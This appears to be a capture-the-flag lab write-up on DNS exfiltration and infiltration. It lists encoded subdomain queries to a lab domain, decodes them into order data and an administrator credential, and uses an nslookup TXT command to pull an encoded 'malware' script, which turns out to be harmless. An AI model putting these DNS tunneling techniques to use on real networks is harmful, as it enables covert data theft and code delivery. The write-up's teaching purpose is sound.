> DNS Manipulation

# Task 1

## Given : 2 files order.pcap (suspicious DNS queries) and TASK 

1. What is the Transaction name?

Look at all DNS queries => tshark -r order.pcap -T fields -e dns.qry.name

```
8.8.8.8.in-addr.arpa

8.8.8.8.in-addr.arpa
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in.localdomain
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in

g3KvmYb7QTUtBwLWHzLVvci.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in.localdomain
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in
uggjU4KyhVyWxVwUo6opxqj.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in.localdomain
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
ezvXjzr3TsQyt77rZjyBCra.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain

iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in.localdomain
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
iNGQ4VrvPigx5Q1SYzv6ors.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in.localdomain
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
nuYDfHko8XQgfbY42GD58gr.badbaddoma.in

nuYDfHko8XQgfbY42GD58gr.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in.localdomain
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in
ncjhw7ZvdFUNPLk5Vn4Ereo.badbaddoma.in



8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in.localdomain
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
fBevjXRyackcAiYG2FhqGtn.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain

gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in.localdomain
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
gEpjMMcCs8351YngnnVMith.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in.localdomain
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
aKxisGedhKCyZ53N3VbGktq.badbaddoma.in

aKxisGedhKCyZ53N3VbGktq.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in.localdomain
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in
ntf22JV8LJV7Fphzamc43ef.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in.localdomain
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
sLL7rY74op4Z4MY62dHD7gu.badbaddoma.in
8.8.8.8.in-addr.arpa

8.8.8.8.in-addr.arpa
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in.localdomain
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
oiZ8UTfBha1iGoRCsFX8Atb.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in.localdomain
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in

kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
kCmBxBkwsA5WCTwvewwtdaq.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in.localdomain
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in
dYYj7A8KvbvxuZpKU8Qxfoc.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in.localdomain
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in
jsn7pnyg2DA5irUDFPSZPcp.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in.localdomain
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
fHSBAkVFSPPkCuWjuwEDPco.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in.localdomain
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in

gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
gkgfnyzECoM5HRLpRCZvajf.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in.localdomain
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in
j9zcTZx5HefQ4ouGd4VCogq.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in.localdomain
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in
u1YfpFPK9dUeX31JdGGdzpm.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in.localdomain
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
piPvXjk5Hk7mtAEdh3nL9kt.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain

m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in.localdomain
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
m6M9Womy5FwcBY8KiNqgGin.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in.localdomain
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in

abvXkjT7sNLE9Gz4HYVyZif.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in.localdomain
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in
fxSK8oRWRU2CFjTdZJwuqus.badbaddoma.in

8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in.localdomain
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
mijxmEMopNo8GL1XgKygnpt.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain

kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in.localdomain
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
kLwwQB26HpEJQ9SW84YqJre.badbaddoma.in
8.8.8.8.in-addr.arpa
8.8.8.8.in-addr.arpa
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in.localdomain
h9JNrq5zMfnLyncog.badbaddoma.in
h9JNrq5zMfnLyncog.badbaddoma.in
h9JNrq5zMfnLyncog.badbaddoma.in

h9JNrq5zMfnLyncog.badbaddoma.in









wpad
wpad

wpad
wpad
```

2. Decoding the file

```
python3 ~/dns-exfil-infil/packetyGrabber.py 
File captured: order.pcap
Filename output: task1.txt
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to task1.txt
```

## Output

```
DATE	ORDER-ID	TRANSACTION	PRICE	   CODE
01-06	   1		Network Equip.	$2349.99    -
01-09	   2		Software Licen. $1293.49    -
01-11	   3		Physical Secur.	$7432.79    -
02-06	   4		SENT TO #1056..	$15040.23   -
02-06	   5		1M THM VOUCHER  $10	   zSiSeC
```

# Task2

Repeating the same process, we are given 3 files cap1.pcap, cap2.pcap and cap3.pcap. Read DNS queries using tshark and decode data using packetyGrabber.py.

`administrator:s3cre7P@ssword`

# Data Infiltration

# Task 1

Reqest a txt record from code.badbaddoma.in and get the malware.

nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > mal.py


```
YeeTbunLbACdXq193g6VHXRuDQ9Y1upaAzA3UkpCr8yBBE68JEXU32wxNE44
```

```
python3 ~/dns-exfil-infil/packetySimple.py 
Filename: mal.py
=> Contents: import os; print(os.uname()[2])
```